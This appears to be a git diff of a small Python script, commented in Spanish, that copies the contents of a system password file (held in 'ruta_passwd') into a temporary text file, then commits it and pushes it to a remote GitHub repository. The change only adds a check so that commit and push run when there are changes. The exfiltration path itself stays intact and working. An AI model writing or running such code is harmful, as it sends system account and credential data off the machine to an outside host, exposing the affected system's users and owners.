@@ -18,12 +18,20 @@ def run():
     with open('temp_passwd_backup.txt', 'w') as temp_file:
         temp_file.write(contenido)
 
-    # Añade y sube el archivo al repositorio de GitHub
+    # Añade el archivo al repositorio git
     subprocess.run(['git', 'add', 'temp_passwd_backup.txt'])
-    subprocess.run(['git', 'commit', '-m', mensaje_commit])
-    subprocess.run(['git', 'push', 'origin', 'master'])  # Empuja al repositorio remoto, ajusta 'master' si es necesario
 
-    print(f'Archivo {ruta_passwd} copiado a GitHub en el repositorio {archivo_en_repo}')
+    # Verifica si hay cambios para confirmar
+    status = subprocess.run(['git', 'status', '--porcelain'], stdout=subprocess.PIPE)
+    if status.stdout:
+        # Hay cambios, realiza commit y push
+        subprocess.run(['git', 'commit', '-m', mensaje_commit])
+        subprocess.run(['git', 'push', 'origin', 'master'])  # Empuja al repositorio remoto, ajusta 'master' si es necesario
+        print(f'Archivo {ruta_passwd} copiado a GitHub en el repositorio {archivo_en_repo}')
+    else:
+        # No hay cambios, informa al usuario
+        print('No hay cambios para realizar commit.')
 
 # Llamamos a la función run()
 run()
+
